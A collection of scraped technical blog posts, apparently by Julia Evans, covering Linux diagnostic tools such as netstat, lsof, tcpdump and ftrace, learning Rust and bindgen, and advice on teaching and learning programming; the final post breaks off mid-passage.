{"url": "https://jvns.ca/blog/2015/04/06/a-few-spy-tools-for-your-operating-system-other-than-strace/", "title": "A few spy tools for your operating system (other than strace!)", "content": "\n      There are  so many  awesome tools you can use to find out what’s going on with\nyour computer. Here are some that exist on Linux. They might exist on your OS\ntoo! \n\n netstat \n\n netstat tells you what ports are open on your computer. This is crazy useful if\nyou want to know if the service that is  supposed  to be listening on port 8080\nis  actually  listening on port 8080. \n\n sudo netstat -tulpn\n[sudo] password for bork: \nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address       Foreign Address     State       PID/Program name\ntcp        0      0 127.0.0.1:631       0.0.0.0:*           LISTEN      1658/cupsd      \ntcp        0      0 127.0.0.1:5432      0.0.0.0:*           LISTEN      1823/postgres   \ntcp        0      0 127.0.0.1:6379      0.0.0.0:*           LISTEN      2516/redis-server\n \n\n If you look at the Program Name column on the right, you’ll see that\napparently I have cupsd (printing), postgres, and redis servers running\non my machine, as well as some other stuff that I redacted. I actually\nhave no idea why I had redis installed so uh yeah I uninstalled it. \n\n I use netstat pretty often when I’m trying to debug “omg why is this\nthing not running IT IS SUPPOSED TO BE RUNNING”. netstat tells me the\ntruth about whether it is running. \n\n \n\n dstat \n\n Want to know how much data is actually being written to your physical hard\ndrive right this second? YEAH YOU DO. dstat knows that. It prints a row every\nsecond with stats for that second. I love dstat because it’s so simple. \n\n ----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system--\nusr sys idl wai hiq siq| read  writ| recv  send|  in   out | int   csw \n 32  38  30   0   0   0|  28k   81k|   0     0 |   4B  123B| 441  2184 \n 12  29  59   0   0   0|   0   184k|  66B   86B|   0     0 |1428  6031 \n  9  26  65   0   0   0|   0   576k| 518B  528B|   0     0 |1157  4611 \n  9  25  66   0   0   0|   0   144k|   0     0 |   0     0 |1100  5249 \n 14  27  59   0   0   0|   0     0 |  60B    0 |   0     0 |1001  4285 \n  9  29  62   0   0   0|   0   180k| 122B   82B|   0     0 |1166  5416\n \n\n lsof \n\n lsof tells you which files every process has open right now! That’s all!\nIt is awesome the same way dstat and netstat are awesome – you want to\nknow what files are open right now, it tells you what files are open\nright now, you’re done <3. \n\n It can also tell you what position in the file the process is at, so you\ncan find out what kind of progress it’s making reading the file. \n\n ngrep / tcpdump \n\n Okay now we’re moving from “super simple tool that does one thing” to\n“tcpdump that has a billion options and also this whole BPF berkeley\npacket filter business and what is this filter language even”. So I’m\nnot going to explain how to use tcpdump because I don’t even really\nknow. \n\n Let’s say you want to \n\n \n reverse engineer a protocol \n find out if there’s  really  terrible latency or if everything is slow for some other reason \n debug why your POST request is formatted wrong in a world before google chrome dev tools \n \n\n To do all of this, you need to spy on network activity! ngrep and tcpdump\ncapture packets, let you filter them, and show you what you’re looking for. I’m\nnot going to explain how to use them here but  this ngrep tutorial  looks\npretty useful. If you’re looking at output from tcpdump you should probably\ndump it to a pcap file and use Wireshark to look at it instead. Wireshark is\nthe best and way easier to understand because it’s a GUI and it makes\neverything pretty for you. \n\n as always with these systems tools, ngrep / tcpdump will tell you The Truth™\nabout what’s going on on your network. \n\n If you want to know how people use tcpdump, you should read  the replies to this tweet “do you use tcpdump in your day-to-day life? what do you use it for?”  because the people\nwho follow me on twitter are the best. Really go read them! There is so much\ninteresting stuff there. \n\n opensnoop & ftrace \n\n Do you want to know every file your system is opening right now? There’s a\nscript in Brendan Gregg’s\n perf-tools  collection that does\nthat! \n\n I’m mostly including this as an example to show that a lot of stuff is\n possible  to know – the scripts in that repo don’t work with every Linux kernel\nversion (I needed to  modify it \nto get it to work with Linux 3.13). But they use a tracing framework in\nthe Linux kernel called ‘ftrace’ that can tell you all  kinds  of stuff. \n\n ftrace seems like quite a bit of work to learn how to use, but also really\npowerful. Basically you access it by doing various things to files in\n /sys/kernel/debug/tracing , or by using a wrapper command called\n trace-cmd . It’s all built into Linux! \n\n atop \n\n atop is like top, but it shows you more stuff and you need to run it as\nroot. So it’ll show me the CPU & memory usage for each process, but also\nhow much disk & network I/O it’s doing. It’s neat and a little\nterrifying to look at at first (SO MANY NUMBERS). \n\n wow \n\n That’s all for now! If you have other tools you frequently reach for\nwhen trying to figure out what’s going on on your system, I’d be\ninterested to know what they are.  @b0rk  on\nTwitter, as always :) \n\n an aside – I’ve been thinking about man pages recently, and how you can\nread the man page for tcpdump and understand individually all the words,\nbut it’s not a substitute for someone telling you an Awesome Story about\nhow they used tcpdump to debug an intermittent certificate problem or a\nDNS problem and then they Saved the Day. \n"},
{"url": "https://jvns.ca/blog/2016/05/12/a-second-try-at-using-rust/", "title": "A second try at using Rust", "content": "\n     \n\n I used Rust for the first time in late 2013, while trying to write a tiny operating system. At the time, I learned a lot and it was pretty fun, but I found the experience pretty frustrating. There were all these error messages I didn’t understand! It took forever to work with strings! Everyone was very nice but it felt confusing. \n\n I just tried Rust again yesterday! Kamal has been trying to sell me (and  everyone else ) on the idea that if you’re doing systems-y work, and you don’t know any systems language very well, then it’s worth learning Rust. \n\n After a day or so of trying Rust again, I think he’s right that learning Rust is easier than learning C. A few years after first trying, I feel like the language has progressed a lot, and it feels more like writing Python or some other easy language. \n\n Some things I could do easily without working too hard \n\n \n run a process and then match a regular expression on its output \n make a hashmap, store counts in it, and print the top 10 \n format strings nicely and print them \n read command line options \n allocate a lot of memory without creating a memory leak \n \n\n Those things would have been really hard in C (how do you even make a hashmap???\nI think you have to write the data structure yourself or something.). I probably could have figured out how to free memory in C (i hear you use  free  :) ) but honestly I don’t know how to write C and it’s very likely it would have turned into an unmaintainable mess. The things were\nmaybe slightly harder to do than in Python (which is a programming language that\nI actually know), but I think not way way way harder. I was surprised at how easy they were! \n\n a sidebar on learning programming languages \n\n I pair programmed a bunch of Rust code with Kamal, who actually knows Rust. Sometimes when I program, I try to understand everything all at once right away (“what are lifetime? how do they work? what are all these pointer types? omg!!!”). This time I tried a new approach! When I didn’t understand something, I was just like “hey kamal tell me what to type!” and he would, and then my program would work. \n\n I’d fix the bugs that I understood, and he’d fix the bugs I didn’t, and we made a lot of progress really quickly and it wasn’t that frustrating. \n\n I kind of enjoy the experience of having a Magical Oracle to fix my programming problems for me – having someone elide away the harder stuff so I can focus on what’s easy feels to me like a good way to learn. \n\n Of course, you can’t let someone else fix all your hard programs  forever . Eventually I’ll have to understand all about Rust pointers and lifetimes and everything, if I want to write Rust! I bet it’s not even all that hard. But for today I only understand like 6 things and that’s fine. \n\n error messages \n\n I’ve also been mostly happy with the Rust error messages! Sometimes they’re super inscrutable, but often they’re mostly lucid. Sometimes they link to GitHub issues, and someone on the GitHub issue will have a workaround for your problem! Sometimes they come with detailed explanations! \n\n Here’s an example: \n\n $ rustc --explain E0281\n`You tried to supply a type which doesn't implement some trait in a location\nwhich expected that trait. This error typically occurs when working with\n`Fn`-based types. Erroneous code example:\n\n---\nfn foo<F: Fn()>(x: F) { }\n\nfn main() {\n    // type mismatch: the type ... implements the trait `core::ops::Fn<(_,)>`,\n    // but the trait `core::ops::Fn<()>` is required (expected (), found tuple\n    // [E0281]\n    foo(|y| { });\n}\n---\n\nThe issue in this case is that `foo` is defined as accepting a `Fn` with no\narguments, but the closure we attempted to pass to it requires one argument.\n\n \n\n valgrind + perf + rust = <3 \n\n another cool thing I noticed is that you can run valgrind or perf on the Rust program and figure out easily which parts of your program are running slowly! And I think the Rust program even has debug info so you can look at the source code in kcachegrind. This was really cool. I ran into a program with valgrind where my program worked fine in Rust, but when I ran it under valgrind it failed. I don’t understand why this happened at all. \n\n the rust docs actually seem good? \n\n I haven’t delved super a lot into the Rust docs, but so far I’ve been happy: there’s a  book  and lots of other  documentation  and it’s all official on the Rust website! I think they actually paid Steve Klabnik to write docs, which is amazing. \n\n Here is my  Rust project! . More on what it actually does later, but I’m super excited about it (for now it’s a MYSTERY :D :D). \n\n"},
{"url": "https://jvns.ca/blog/2017/11/27/rust-ref/", "title": "What's a reference in Rust?", "content": "\n     \n\n Hello! Recently I am trying to learn Rust (because I am going to do a project in Rust, and to do\nthat I need to learn Rust better). I’ve written a few hundred lines of Rust over the last 4 years,\nbut I’m honestly still pretty bad at Rust and so my goal is to learn enough that I don’t get\nconfused while writing very simple programs. \n\n The audience I’m writing for in this post is a little specific – it’s something like “people who\nhave read the  lifetimes chapter in the Rust book  and sorta understand it in principle but are still confused about a lot of pretty basic Rust things.” \n\n we are going to talk about \n\n \n What even is a reference in Rust? \n What is a boxed pointer / string / vec and how do they relate to references? \n Why is my struct complaining about lifetime parameters and what should I do about it? \n \n\n We are not going to talk about ownership / the borrow checker. If you want to know about ownership you should read  the rust book . Also there is probably at least one mistake in this post. \n\n Let’s start with something extremely basic: defining a struct in Rust. \n\n struct Container {\n    my_cool_pointer: &u8,\n} \n \n\n Pretty simple, right? When I try to compile it, the compiler gives me this error message: \n\n 2 |     my_cool_pointer: &u8,\n  |                      ^ expected lifetime parameter``\n \n\n Why doesn’t this compile? \n\n Digging into why this simple program doesn’t compile is interesting and helped me understand\nsome things about Rust a tiny bit better. \n\n There is a straightforward answer (“it’s missing a lifetime parameter”), but that answer is not that\nuseful. So let’s ask another better question instead! \n\n What does  &  mean? \n\n I didn’t fully appreciate what  &  meant in Rust until yesterday. A  &  is called a “reference” and it\nis very interesting! You might be thinking “julia, this is boring, I KNOW what a reference is, it is\nlike a pointer in C, I know what that is”. \n\n BUT DO YOU REALLY?? \n\n Okay, so let’s say you have a pointer/reference to some memory,  &my_cool_pointer . That memory\ncould be in one of 3 places: \n\n \n on the heap \n on the stack \n in the data segment of your program \n \n\n The most important thing about Rust (and the thing that makes programming in Rust confusing) is that\nit needs to decide  at compile time  when all the memory in the program needs to be freed. \n\n So: let’s say I’ve written a program like this. \n\n fn blah () {\n    let x: Container = whatever();\n    return;\n}\n \n\n When the function  blah  returns,  x  goes out of scope, and we need to figure out what to do with\nits  my_cool_pointer  member. But how can Rust know what  kind  of reference  my_cool_pointer  is?\nIs it on the heap? Who knows?? \n\n So this is no good, Rust can’t compile this program because it doesn’t have enough information about\nwhat kind of reference our reference is. \n\n (to understand what references are it is also helpful to read the  rust book on references & borrowing , that chapter says different things about references which are also true and useful) \n\n making our struct compile with a  Box \n\n If we  knew  that  my_cool_pointer  was allocated on the heap, then we would know what to do when\nit goes out of scope: free it! The way to tell the Rust compiler that a pointer is allocated on the\nheap is using a type called  Box . So a  Box<u8>  is a pointer to a byte on the heap. \n\n This code compiles!! \n\n struct Container {\n    my_cool_pointer: Box<u8>,\n} \n \n\n We can now use our Container struct in a program and run it: \n\n struct Container {\n    bytes: Box<u8>,\n} \n\nfn test() -> Container {\n    // this is where we allocate a byte of memory\n    return Container{bytes: Box::new(23)}; \n}\n\nfn main() {\n    let x = test();\n    // when `main` exits, the memory we allocated gets freed!\n}\n \n\n boxes in Rust vs boxes in Java \n\n As an aside – I got a bit confused by the word “box”. I know in Java you have boxed pointer versions of\nprimitive types, like  Integer  instead of  int . And you can’t really have non-boxed pointers in Java,\nbasically every pointer is allocated on the heap. \n\n Rust boxed pointers ( Box<T> ) are a bit different from Java boxed pointers though! \n\n In Java, a boxed pointer includes an extra word of data (not sure what it’s for exactly, but I know\nthere’s an extra word for something). \n\n In Rust, a boxed pointer  sometimes  includes an extra word (a “vtable pointer”) and sometimes\ndon’t. It depends on whether the  T  in  Box<T>  is a type or a trait. Don’t ask me more, I do not\nknow more. \n\n Anyway, when you have a boxed pointer, the compiler uses the information that it’s allocated on the\nheap in order to decide where in the compiled code to free the memory. In our example above, the\ncompiler would insert a  free  at the end of the  main  function. \n\n what if you want to point to existing memory? \n\n Okay, so now we know how to allocate new memory and refer to it (use a boxed pointer!). But what if\nyou want to refer to some  existing  memory somewhere and point to that? \n\n A good example of this is – I’ve used this DWARF parser called\n gimli . It doesn’t do basically any allocations – it just loads\nall the DWARF data for your program into memory and then points into that data. \n\n This is where you use lifetimes. I’m not going to explain lifetimes because they’re  explained in the Rust book \n\n This program also compiles: \n\n struct Container<'a> {\n    my_cool_pointer: &'a u8,\n} \n \n\n So now we have made our struct compile in 2 different ways: by adding a lifetime parameter to our struct\ndefinition, and by using a boxed pointer instead of a reference. Great! \n\n Let’s talk about things that are allocated on the heap a little more. \n\n How do you know if a Rust variable is allocated on the heap? \n\n So, we learned in this post that if a variable has type  Box<T> , then it’s a pointer to some memory\non the heap. Are there other types that are always on the heap? It turns out there are!!\nHere they are: \n\n \n Vec<T>  (an array on the heap) \n String  (a string on the heap) \n Box<T>  (just a pointer). \n \n\n These 3 types all have equivalent reference types (again: a reference is a pointer to memory in an unknown place):\n &[T]  for  Vec<T> ,  &str  for  String , and  &T  for  Box<T> . \n\n I think these 3 types ( Vec<T> ,  String , and  Box<T> ) are very important in Rust and understanding\nthe relationship between them and their reference version ( &[T] ,  &str ,  &T ) is extremely\nimportant when writing Rust programs. Like I didn’t understand before and I think that has been part\nof why I was so confused about Rust. \n\n Converting from a  Vec<T>  to a  &[T]  is really easy – you just run  vec.as_ref() . The reason you\ncan do this conversion is that you’re just “forgetting” that that variable is allocated on the heap\nand saying “who cares, this is just a reference”.  String  and  Box<T>  also has an  .as_ref() \nmethod that convert to the reference version of those types in the same way. \n\n You can’t as easily convert back from a  &[T]  to a  Vec<T>  though (because a  &[T]  could be\na pointer to memory on the stack, so it doesn’t make sense to just say “this is something on the\nheap”)! To convert back, you’d need to make a clone and allocate new memory on the heap. \n\n there are 2 kinds of structs: those with lifetimes and those without lifetimes \n\n So we have arrived at a useful fact about Rust! \n\n Every struct (or at least every useful struct!) refers to data. Some structs have lifetimes as part\nof their type, and some don’t. \n\n Here’s another example of a struct with no lifetime: \n\n struct NoLifetime {\n    x: Vec<u8>,\n    y: String,\n    z: Box<u8>\n}\n \n\n This struct has pointers to an array, a string, and a byte on the heap. When an instance of this\nstruct goes out of scope all that memory will be freed. \n\n Next, here’s a struct with a lifetime! This struct also has pointers to an array, a string, and a\nbyte. We have no idea from this struct definition where the data this is pointing to will be. \n\n struct Lifetime<'a> {\n    x: &'a [u8],\n    y: &'a str,\n    z: &'a u8\n}\n \n\n I can’t tell you which kind of struct to make your Rust structs because I don’t know yet. \n\n do structs in Rust usually have lifetimes or not? \n\n One question I have (that I think I will just resolve by getting more Rust experience!) is – when I\nwrite a Rust struct, how often will I be using lifetimes vs making the struct own all its own data? \n\n I looked in  https://github.com/BurntSushi/ripgrep , and most of the struct definitions there do not\nhave lifetimes. I don’t know what that tells me! \n\n that’s all for now \n\n I learned a lot of useful things by writing this blog post! Now I am going to go back to writing\nRust programs and see if all this newfound knowledge helps me write them in a less confused way. \n\n"},
{"url": "https://jvns.ca/blog/2014/04/04/ask-if-you-have-questions-isnt-enough/", "title": "\"Ask if you have questions\" isn't enough", "content": "\n      I’ve helped out and taught at a few programming workshops for\nbeginners now, and I’ve noticed something. There are always helpers\nwho have tons of experience and are super willing to answer questions.\nAnd there’s always an announcement where someone says “Here are the\nhelpers! They are here just to help you. Raise your hand if you have\nquestions!“. \n\n And it’s not enough. Inevitably people will not ask because they’re\nscared or they think it’s their fault and then they’ll get stuck. \n\n Here are some things I try to do when I help out at workshops. \n\n \n\n \n Circulate! Ask people “hey are you okay? Everything working well?” \n If everybody’s saying yes, some of them are not okay and just not\ntelling you. Ask more questions! “How are you finding it so far?”.\nIf you talk to someone for a minute sometimes they’ll come out with\n“well everything is fine but this weird thing is happening… can\nyou take a look?” \n Watch out for confused faces and sad people! Go talk to people with\nconfused faces and try to see how they’re doing! \n Keep asking the same people if they’re okay over and over again. If\nyou keep talking to them, they’ll be much more likely to ask you\nwhen they  do  have a problem. \n When someone raises their hand I have a lot of dialogues like this:\n\n \n Hey I have a ques- \n GREAT. I LOVE QUESTIONS. WHAT IS YOUR QUESTION \n question question \n That’s definitely something we can solve! Oh that’s actually a\nmistake in the directions! That’s totally our fault! Sorry about\nthat! \n \n I really do like answering programming questions, so I act super\nexcited about it. I think/hope this makes it easier for people to\nask me because they don’t feel like it’s a burden. \n A script: I love questions! We can solve that for sure! Lots of\nother people are having that problem! You’re doing great! I’m happy\nyou’re here! \n \n\n It feels weird to ask the same people if they’re doing okay over and\nover and over and over and over again, but I think it really does\nhelp. \n\n This feels more effective and like a better use of my time as a helper\nthan standing in the corner waiting for someone to flag me down. And\nmore fun! \n"},
{"url": "https://jvns.ca/blog/2017/12/21/bindgen-is-awesome/", "title": "Bindgen: awesome Rust tool for generating C bindings", "content": "\n     \n\n Yesterday I made a category for these ruby profiler posts on my blog because I think there\nwill be a lot of them. It’s at  https://jvns.ca/categories/ruby-profiler . \n\n Hello! Today I am excited about bindgen, an awesome Rust tool for generating bindings from C header files. It has a\n great user’s guide . \n\n This post is about what bindgen is, why I think it’s cool, and experiments I have been doing with bindgen for my Ruby profiler. \n\n bindgen: #include for Rust \n\n To me the dream of Rust is “it gives you all the power of C, but with a more powerful compiler, better documentation, better tools ( cargo ), and a great community”. I think bindgen is a really important part of “great tools”! \n\n Suppose you want to include a C library in your program. In C, this is easy: just include the header file. \n\n #include <library_header_file.h>\n\n…. call functions from library here ...\n \n\n So if Rust has “all the power of C” (and interoperates so well with C), you should be able to just  #include  a header file from a C library and have it just work, right? \n\n Almost! You can run  bindgen cool_header_file.h -o rust-bindings.rs  and it’ll automatically generate Rust struct definitions or function declarations that will let you link in the C library. So simple! \n\n Here’s  the bindgen output for Python.h  as an example. It’s 24,000 lines. Here are a couple of representative bits: the PyCodeObject struct & the declaration of the eval function. \n\n // A struct!\n#[repr(C)]\n#[derive(Debug, Copy, Clone)]\npub struct PyCodeObject {\n    pub ob_refcnt: Py_ssize_t,\n    pub ob_type: *mut _typeobject,\n    pub co_argcount: ::std::os::raw::c_int,\n    pub co_nlocals: ::std::os::raw::c_int,\n    pub co_stacksize: ::std::os::raw::c_int,\n    pub co_flags: ::std::os::raw::c_int,\n    pub co_code: *mut PyObject,\n    … and more ...\n}\n// A function declaration!\nextern \"C\" {\n # [ link_name = \"\\u{1}_Z15PyEval_EvalCode\" ]\n    pub fn PyEval_EvalCode(\n        arg1: *mut PyCodeObject,\n        arg2: *mut PyObject,\n        arg3: *mut PyObject,\n    ) -> *mut PyObject;\n}\n \n\n Then you can include this file in your Rust project as a module, link with libpython, and start\nusing libpython in your Rust program! Cool! \n\n cool bindgen features \n\n Bindgen can do some really cool things: \n\n \n Whitelist types that you want to generate bindings for if you don’t want the whole header file \n Generate #[derive(Debug)] annotations for C structs so you can easily print them out with  println!(“{:?}”, my-struct) . This is SO USEFUL when debugging!!!! \n It seems to handle  #ifdefs  and stuff okay – I threw a pretty complicated set of header files at it and it seems ok so far. \n Pick which Rust compiler version you want to target \n \n\n what I’m doing with bindgen \n\n I wanted to do something weird:  #include  vm_core.h, which is an internal header file in Ruby. And I didn’t actually want to just include one  vm_core_h , I wanted to generate bindings for 33 different Ruby versions (since vm_core.h is an internal header file, the structs I care about are  constantly changing ). \n\n This appears to be something that  bindgen  can help with me with! Here are the generated bindings for 33 Ruby versions (2.1.1 to 2.5.0rc1):  https://github.com/jvns/ruby-stacktrace/tree/77708ffb0db6682df546170bf09753a195afa7d5/src/bindings . Bindgen generated about 6MB of code. (the rest of the code on that branch is kind of a mess since I’m hacking around trying to see if this approach is workable). \n\n Once I have all those bindings in my repository, I can  use bindings::ruby_2_2_0::*;  to get the right types for Ruby 2.2.0. Really simple! \n\n Here’s the bindgen incantation I ran to get the bindings for Ruby 2.3.0. (I just put this in a script and ran a for loop to generate all 33 versions). \n\n bindgen /tmp/headers/2_3_0/vm_core.h\\\n    -o bindings.rs \\\n    --impl-debug true \\\n    --no-doc-comments \\\n    --whitelist-type rb_iseq_constant_body \\\n    --whitelist-type rb_iseq_location_struct \\\n    --whitelist-type rb_thread_struct \\\n    --whitelist-type rb_iseq_struct \\\n    --whitelist-type rb_control_frame_struct \\\n    --whitelist-type rb_thread_struct \\\n    --whitelist-type RString \\\n    --whitelist-type VALUE \\\n    -- \\\n    -I/tmp/headers/2_3_0/include \\\n    -I/tmp/headers/2_3_0/ \\\n    -I/usr/lib/llvm-3.8/lib/clang/3.8.0/include/ # my bindgen doesn’t find the clang headers properly for some reason\n \n\n generating bindings at build time \n\n You might have noticed that I committed the bindings I generated into my repository. This is not\nactually the recommended way to use bindgen – they recommend in general that you generate your\nbindings during your build. \n\n How to do that is  documented really nicely in the bindgen user’s guide . \n\n Basically you create a  build.rs  file that runs during your build and uses the bindgen library to generate bindings. I think I like the approach of having a  build.rs  + Cargo.toml instead of a Makefile a lot – it seems easier to maintain. And you can declare separate build dependencies in Cargo.toml! \n\n cbindgen: reverse bindgen \n\n Someone on Twitter pointed me to  cbindgen , a tool to go the\nother way and generate C bindings for your Rust code. Neat! \n\n gonna continue experimenting \n\n I’m still not sure if this approach of “let’s generate bindings for 33 different ruby versions and commit them into my repository” will work. But I figure the best way to find out it to keep trying it and see how it goes! If it doesn’t work then I’ll go back to using DWARF. \n\n"},
{"url": "https://jvns.ca/blog/2017/01/04/rules-of-programming-experiments/", "title": "Rules of programming experiments", "content": "\n      Rules of programming experiments: \n\n \n it doesn’t have to be good \n it doesn’t have to work \n you have to learn something \n \n\n I wrote this in a talk slide once: \n\n \n\n and I wanted to say a tiny bit more about it. I think one other thing\nthat defines “programming experiments” for me is – often the\nexperiment doesn’t take that much time (maybe 4 hours on a Wednesday\nevening), and when I’m done I don’t have to maintain it or\nanything. This makes it a lot more tractable for me than stuff like\n“work on actual real open source projects” which I have exactly 0 energy\nfor after programming at work. \n\n I also spent 12 weeks doing programming experiments full time at the  recurse\ncenter  and it was awesome. These days I have\nsubstantially less time to devote to them :) \n\n A few examples of things that have fallen into this category for me: \n\n \n Spending some time on a train running strace on “killall” \n writing an operating system in rust  (this took 3 weeks which is a pretty long time, but fell very far short of “operating system”, and I learned a ton. huge success.) \n investigating Hadoop by stracing some code that interacts with HDFS ( diving into HDFS ) \n how does SQLite work? \n learning about LD_PRELOAD \n \n\n and, well, a bunch more on this blog. I think it’s an interesting\nreason to write programs because the program itself is totally\nincidental (I usually put them on the internet, but certainly not for\nanyone to  use  or anything). It’s more about \n\n \n does this work? \n what happens if I do  this ? \n can I write a small program that helps me look at\nIMPORTANT_NEW_CONCEPT? (like threading?) \n \n\n"},
{"url": "https://jvns.ca/blog/2017/08/06/learning-at-work/", "title": "Learning at work", "content": "\n     \n\n I asked on Twitter a while back “how do you invest in you own learning?” ( this tweet . Some common things people replied with: \n\n \n Read blog posts \n Go to conferences \n Read books \n Watch talks while washing the dishes \n Build side projects using the technologies you want to learn \n \n\n These things all totally work. I see that it’s pretty common to spend time\noutside of work working on your career development and learning new skills, and\nit’s certainly something I’ve done a lot. \n\n But I know some great programmers who  don’t  program outside of work at all!\nSo I got to thinking – what if you want to become awesome, but don’t want to\nspend a lot of time basically doing extra work after hours? \n\n Here are some things me & people on twitter came up with. Everything in here is\nstuff I can do during my workday. \n\n Don’t learn programming languages/frameworks outside of work \n\n This one is kind of negative but I think it’s useful! My view about learning programming languages is: \n\n \n I know a few languages reasonably well (python, scala, ruby) \n Learning a new programming language well takes a fair amount of time \n I don’t feel like spending my free time on it \n \n\n Right now at work I’m working a bit in Go! That is interesting and I’m happy to\nbe doing it. But it is not  so  fun that I feel like spending a lot of my\npersonal time on it. And I don’t really think it’s necessary, I learn languages\nby writing them, reading other people’s code to learn about conventions, and\nhaving my code reviewed. I can just do all of those things at work! \n\n To be clear, I don’t think it’s  bad  to learn programming languages outside of\nwork. I just don’t really do it. \n\n Choose projects I think I’ll learn from \n\n Some of the things I”ve learned about in the last 3 years at stripe: \n\n \n Scala/Ruby/Go \n hadoop/mapreduce/scalding \n How to work with java concurrency libraries, how to profile a java program \n A ton about how various AWS services work \n A lot about machine learning \n How networking / CDNs / TLS work \n docker/containers/rkt/kubernetes \n Service discovery / DNS / jenkins \n \n\n and a bunch more things. \n\n As an small example of choosing something to work on that I wanted to learn from –\nonce I was using a program at work that wasn’t parallelizing its work well and\nit was a problem. I could have asked the people who wrote it to figure out the\nprogram but I thought – well, I’m interested in learning about concurrent\nprogramming, I can probably do this! So I  learned a bit about how to use thread pools in Java! \n\n I only worked on that for a few days but I learned new things! \n\n Right now I am working on Kubernetes which I didn’t really pick for its\nlearning opportunities, but I  am  learning quite a few things about\ndistributed systems and Go by working with it and I’m happy about that. \n\n I think it’s silly when people are like “hey, we work with X technologies, you\nneed to have experience with them to work here”. Right now I spend a lot of\ntime with networking/puppet/kubernetes/docker/AWS and I had never worked with\nany of those things before this job. \n\n Watch more senior people operate \n\n When someone is doing work I really admire, I’ll watch how they do it and then try to emulate them / ask them for advice. For example! When  cory  joined I noticed that, when introducing new technology, he would \n\n \n find another team that had a related problem that needed solving \n Work with them to make sure the technology actually worked to solve their problem! \n \n\n Right now I am working on a newish project, and I’ve been careful about\nremembering who exactly I expect it to help & how, and I think that’s made the\nwork go a lot better. \n\n Read every pull request \n\n Two quotes I loved from this thread were: \n\n \n i’m on a small team so I read & reread every pull request that comes in until\nI understand the problem & solution fully \n \n\n and \n\n \n I did the same! And I stalked checkins to see how people solved various\nproblems \n \n\n I don’t actually read every single pull request on my team. But I  do  find\nit useful to pick a few areas I want to keep learning about, and keep track\nover time of the work people are doing in that area. \n\n I definitely can’t always do this – for example I used to work on machine\nlearning and while in theory I’d like to keep track of what people are up to\nthere because I find it really interesting, in practice it’s too much for me to\npay attention to. But I do try to pay attention to things that are closer to me\n(like some of the networking team’s work!) \n\n Read the source code \n\n \n Reading source of what I use is a big one for me. Understand what it does\ninternally but mainly  why  it does it a certain way. \n \n\n I think this is a fantastic tip and super important!! A lot of systems aren’t\nreally that well documented and you can’t learn how they work without reading\ntheir source code. \n\n Follow up on bugs I couldn’t figure out \n\n Sometimes I see a bug that I can’t figure out how to fix. And then later,\nsometimes somebody else will figure out the answer! When that happens, I like\nto really take the time to understand what the answer was and how they figured\nit out! \n\n For example recently there was a networking issue that I didn’t manage to debug\nand that somebody else just figured out last week. Thinking about it now, I\nunderstand what the bug  was , but I’m not 100% sure what tools they used to\nget the information they needed to debug it. When I get back to work I need to\nmake sure I go find that out, so that next time I will be better equipped! \n\n Jessica Kerr commented \n\n \n Whenever I have to look something up for troubleshooting, I go a little deeper\nor broader than strictly necessary. \n \n\n which I think is a great philosophy :) :) (it’s not good to go  too  far\ndown every rabbit hole, but consistently reaching a little further than I have\nto pays dividends for sure) \n\n I also liked this answer: \n\n \n Sometimes I’ll just dig into a problem that’s work-related but not really\nwithin my actual duties and see if I can get somewhere. \n \n\n Use your commute \n\n I don’t have a commute but a lot of people mentioned using their commute time\nto listen to podcasts / read papers / read interesting articles. I think\nthis seems like an awesome way to keep up with things you’re interested in! \n\n Take the time at work to learn \n\n Someone on Twitter said “I wish I could take 1 hour a day to learn”. My view is\nthat it’s my  job  to take time out of my workday to learn things. Like\nright now I’m using Kubernetes at work, it’s a complicated system that takes a\nlong time to understand, and I spend time reading about it at work. For\ninstance, when we were starting out I spun up a test cluster just to poke\naround and try to understand how container networking works. I also make\nprogress on our projects at the same time! \n\n This is probably a bit easier for me because I work remote so nobody really knows\nwhat I’m doing hour-by-hour anyway, People just care about what I’m getting\ndone overall. \n\n I actually think I would probably be  more  productive if I took a little more\ntime to read in advance. Like I just read Kelsey Hightower’s “learn kubernetes\nthe hard way” document, it didn’t take that long, and it had one really good\nidea about how to set up a cluster that would have saved me some time. \n\n Some people take this idea even farther! For example, my friend Dan has\nmentioned a few times that he likes to read technical books at work. I\noriginally found this kind of surprising but it makes sense – there are some\nbooks that are relevant to my work, and there’s no reason really why I\nshouldn’t read them at\nwork. \n\n"},
{"url": "https://jvns.ca/blog/2018/01/13/rust-in-2018--way-easier-to-use/", "title": "Rust in 2018: it's way easier to use!", "content": "\n     \n\n I’ve been using  Rust  on and off since late 2013. 4 weeks ago, I\npicked up Rust again, and the language is SO MUCH EASIER than it was the last time I tried it (May 2016). I\nthink that’s really exciting! So I wanted to talk about why I like using Rust today, and a couple of\nideas for where Rust could go in the next year!  (as a response to the  call for community\nblogposts ) \n\n me & Rust \n\n I’m an intermediate Rust programmer (definitely not advanced!). Right now I’m writing a profiler in\nRust, which is about 1300 lines of Rust code so far. In 2013 I  wrote a tiny 400-line “operating system’  in Rust (basically a small keyboard\ndriver). \n\n Despite not having much Rust experience (less than 10 weeks of actively using it), I think Rust has\nalready enabled me to do a lot of awesome things! Like – I’m writing a Ruby profiler in Rust which\nextracts Ruby stack traces from arbitrary Ruby programs with only access to its PID, its memory\nmaps, and the ability to read memory from the process. And it works! Like, I still have some work to\ndo to get out the first release, but on my laptop it works across  35 different Ruby versions \n(from 1.9.1 to 2.5.0)! It works even if the Ruby program’s symbols are stripped and there’s no\ndebug info! \n\n That feels really astonishing and magical to me, and I really don’t think I could have accomplished\nso much so quickly without Rust. \n\n Rust’s compiler is more helpful than it was in 2016 \n\n One cool thing about being a sporadic Rust user is seeing the huge improvements in the compiler! I\nlast used Rust (for the same ruby profiler project) in May 2016. \n\n In 2016, my experience of using the Rust compiler was that it was hard. In my  RustConf talk in 2016 , I said: \n\n \n I spend a lot of time being frustrated with the Rust compiler, but I still like it because it lets\nme do things I probably wouldn’t get done otherwise. \n \n\n I don’t spend as much time being frustrated with the Rust compiler anymore. But it’s not because\nI’ve learned a lot more about Rust (I haven’t, yet!) I think it’s mostly because the  compiler is\nmore helpful . \n\n This is of course not by magic, it’s because of a huge amount of work on the part of Rust\ncontributors.\nIn Rust’s  2017 roadmap , they announced a\nfocus on productivity for 2017, saying: \n\n \n A focus on productivity might seem at odds with some of Rust’s other goals. After all, Rust has\nfocused on reliability and performance, and it’s easy to imagine that achieving those aims forces\ncompromises elsewhere—like the learning curve, or developer productivity. Is “fighting with the\nborrow checker” an inherent rite of passage for budding Rustaceans? Does removing papercuts and\nsmall complexities entail glossing over safety holes or performance cliffs? \n \n\n and \n\n 